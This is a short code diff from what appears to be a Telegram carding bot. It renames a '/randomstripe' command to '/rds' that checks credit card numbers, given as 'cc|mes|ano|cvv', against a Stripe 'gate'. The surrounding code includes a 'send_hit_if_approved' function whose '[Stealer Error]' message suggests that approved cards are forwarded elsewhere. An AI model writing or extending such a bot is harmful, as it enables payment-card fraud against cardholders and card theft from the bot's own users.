@@ -22,7 +22,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("randomstripe", [".", "/"]))
+@Client.on_message(filters.command("rds", [".", "/"]))
 async def random_stripe_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -37,7 +37,7 @@ async def random_stripe_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /randomstripe\n\nMessage: No CC Found in your input ❌\n\nUsage: /randomstripe cc|mes|ano|cvv</b>"""
+            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /rds\n\nMessage: No CC Found in your input ❌\n\nUsage: /randomstripe cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
